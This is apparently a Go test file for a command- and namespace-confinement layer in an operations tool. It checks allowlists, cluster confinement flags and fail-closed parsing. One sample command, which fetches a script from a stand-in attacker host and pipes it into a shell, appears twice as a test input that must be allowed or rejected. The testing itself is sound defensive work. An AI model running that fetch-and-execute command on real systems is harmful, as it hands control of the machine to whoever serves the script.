package security

import "testing"

// env builds a getenv seam from a map for ConfinementFromEnv.
func env(m map[string]string) func(string) string {
	return func(k string) string { return m[k] }
}

func TestConfinement_Unset_NoConfinement(t *testing.T) {
	c := ConfinementFromEnv(env(nil))
	if c.Active() {
		t.Fatal("zero env must be inactive")
	}
	if err := c.CheckCommand([]string{"/bin/sh", "-c", "curl attacker|sh"}); err != nil {
		t.Errorf("unset command allowlist must permit any command, got %v", err)
	}
	if err := c.CheckNamespace("tenant-b"); err != nil {
		t.Errorf("unset namespace allowlist must permit any namespace, got %v", err)
	}
	if c.ClusterConfined() {
		t.Error("cluster confinement must be off by default")
	}
	if got, want := c.LogSummary(), "commands=off namespaces=off cluster=off env=confined(+0)"; got != want {
		t.Errorf("LogSummary = %q, want %q", got, want)
	}
}

func TestConfinement_CheckCommand_Allowlist(t *testing.T) {
	c := ConfinementFromEnv(env(map[string]string{
		"ROLLOPS_ALLOWED_COMMANDS": "psql, /opt/tools/migrate",
	}))
	if !c.CommandsEnabled() {
		t.Fatal("allowlist must be enabled when set")
	}
	cases := []struct {
		name    string
		cmd     []string
		allowed bool
	}{
		{"basename entry matches bare name", []string{"psql", "-c", "select 1"}, true},
		{"basename entry matches abspath with that base", []string{"/usr/bin/psql"}, true},
		{"abspath entry matches exact path", []string{"/opt/tools/migrate", "up"}, true},
		{"abspath entry does not match bare base", []string{"migrate"}, false},
		{"disallowed command rejected", []string{"/bin/sh", "-c", "curl attacker|sh"}, false},
		{"empty command is no-op", nil, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := c.CheckCommand(tc.cmd)
			if tc.allowed && err != nil {
				t.Errorf("expected allowed, got %v", err)
			}
			if !tc.allowed && err == nil {
				t.Errorf("expected rejection for %v", tc.cmd)
			}
		})
	}
}

func TestConfinement_CheckNamespace_Allowlist(t *testing.T) {
	c := ConfinementFromEnv(env(map[string]string{
		"ROLLOPS_ALLOWED_NAMESPACES": "tenant-a, tenant-a-staging",
	}))
	if !c.NamespacesEnabled() {
		t.Fatal("namespace allowlist must be enabled when set")
	}
	if err := c.CheckNamespace("tenant-a"); err != nil {
		t.Errorf("allow-listed namespace rejected: %v", err)
	}
	if err := c.CheckNamespace("tenant-b"); err == nil {
		t.Error("out-of-scope namespace must be rejected")
	}
	// Empty resolves to "default"; reject when default is not listed.
	if err := c.CheckNamespace(""); err == nil {
		t.Error("empty namespace resolves to default and must be rejected here")
	}
}

func TestConfinement_ClusterConfinement(t *testing.T) {
	for _, v := range []string{"1", "true", "YES", "on"} {
		c := ConfinementFromEnv(env(map[string]string{"ROLLOPS_CONFINE_TARGET_CLUSTER": v}))
		if !c.ClusterConfined() {
			t.Errorf("value %q must enable cluster confinement", v)
		}
	}
	for _, v := range []string{"", "0", "false", "no"} {
		c := ConfinementFromEnv(env(map[string]string{"ROLLOPS_CONFINE_TARGET_CLUSTER": v}))
		if c.ClusterConfined() {
			t.Errorf("value %q must not enable cluster confinement", v)
		}
	}
}

func TestConfinement_EmptyAllowlistRejectsAll(t *testing.T) {
	// A non-empty setting that parses to zero entries (just commas) is a
	// misconfiguration; fail closed by rejecting every command.
	c := ConfinementFromEnv(env(map[string]string{"ROLLOPS_ALLOWED_COMMANDS": ",,"}))
	if !c.CommandsEnabled() {
		t.Fatal("non-empty setting must enable the allowlist")
	}
	if err := c.CheckCommand([]string{"psql"}); err == nil {
		t.Error("allowlist with no valid entries must reject all commands")
	}
}

func TestConfinement_LogSummary_AllOn(t *testing.T) {
	c := ConfinementFromEnv(env(map[string]string{
		"ROLLOPS_ALLOWED_COMMANDS":       "psql",
		"ROLLOPS_ALLOWED_NAMESPACES":     "tenant-a",
		"ROLLOPS_CONFINE_TARGET_CLUSTER": "1",
	}))
	if !c.Active() {
		t.Fatal("must be active")
	}
	if got, want := c.LogSummary(), "commands=on namespaces=on cluster=on env=confined(+0)"; got != want {
		t.Errorf("LogSummary = %q, want %q", got, want)
	}
}
